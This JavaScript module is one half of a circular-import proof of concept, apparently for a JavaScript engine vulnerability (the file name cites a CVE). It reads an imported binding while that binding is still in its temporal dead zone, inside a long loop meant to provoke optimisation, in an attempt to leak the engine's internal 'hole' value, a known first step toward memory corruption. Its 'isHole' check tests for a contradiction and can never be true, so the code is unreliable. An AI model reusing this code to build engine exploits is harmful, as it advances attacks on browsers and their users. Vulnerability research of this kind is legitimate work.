// Partner module for circular import exploit
import { x } from './cve1862_circ_a.mjs';

// During this module's evaluation, circ_a hasn't finished
// So x is in TDZ (the hole)

export function readX() {
  return x;
}

// Try to warm up readX and then leak
// During evaluation, x is in TDZ
let leakResult = null;

export function warmAndLeak() {
  return leakResult;
}

// Attempt OSR leak during module evaluation
function doLeak() {
  for (let i = 0; i < 5000000; i++) {
    if (i === 4999999) {
      return x; // x is in TDZ during circ_b evaluation!
    }
  }
}

try {
  leakResult = { leaked: doLeak(), source: "circ_b_eval" };
  leakResult.type = typeof leakResult.leaked;
  leakResult.isUndef = leakResult.leaked === undefined;
  leakResult.isHole = (typeof leakResult.leaked === "undefined" && leakResult.leaked !== undefined);
} catch(e) {
  leakResult = { error: e.message, source: "circ_b_eval" };
}
